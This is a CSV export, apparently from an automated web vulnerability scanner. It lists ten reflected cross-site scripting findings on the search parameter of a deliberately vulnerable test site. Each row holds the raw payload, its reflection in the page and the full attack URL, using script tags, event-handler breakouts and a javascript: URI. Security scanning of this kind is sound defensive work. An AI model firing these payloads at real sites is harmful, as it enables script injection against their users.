scan_id,type,severity,method,vector,param,status,evidence,merged_url,timestamp
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '<script>alert(1)</script>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '<ScRiPt>alert(1)</ScRiPt>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '""><script>alert(1)</script>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '"" onmouseover=""alert(1)""'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22+onmouseover%3D%22alert%281%29%22,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '""><a onmouseover=""alert(1)"">hover</a>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22%3E%3Ca+onmouseover%3D%22alert%281%29%22%3Ehover%3C%2Fa%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for 'javascript:alert(1)//'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=javascript%3Aalert%281%29%2F%2F,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '<img src=x onerror=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '<svg onload=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg+onload%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '<video src=x onerror=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cvideo+src%3Dx+onerror%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
        <div class='path'>You searched for '"" onfocus=""alert(1)"" autofocus ""'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22+onfocus%3D%22alert%281%29%22+autofocus+%22,2025-11-21T19:34:52.694479
